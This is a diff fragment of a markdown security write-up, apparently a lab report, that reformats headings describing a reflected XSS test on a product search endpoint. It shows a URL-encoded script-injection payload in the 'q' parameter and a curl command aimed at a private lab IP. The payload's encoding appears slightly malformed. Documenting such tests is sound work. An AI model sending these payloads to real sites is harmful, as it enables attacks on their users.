@@ -254,13 +254,15 @@ An attacker issues an HTTP `GET` request containing a URL-encoded JavaScript scr
 GET /rest/products/search?q=%3Cscript%3Ealert%27xss%27%29%3C%2Fscript%3E HTTP/1.1
 ```
 
-##Attack Vector & Tool
+## Attack Vector & Tool
 
-Tool: curl
+### Tool: 
+curl
 
-Vector: Injected Search Query Parameter (q)
+### Vector: 
+Injected Search Query Parameter (q)
 
-Command
+### Command
 
 ```bash
 curl -i "[http://192.168.50.30/rest/products/search?q=%3Cscript%3Ealert%27xss%27%29%3C%2Fscript%3E](http://192.168.50.30/rest/products/search?q=%3Cscript%3Ealert%27xss%27%29%3C%2Fscript%3E)"
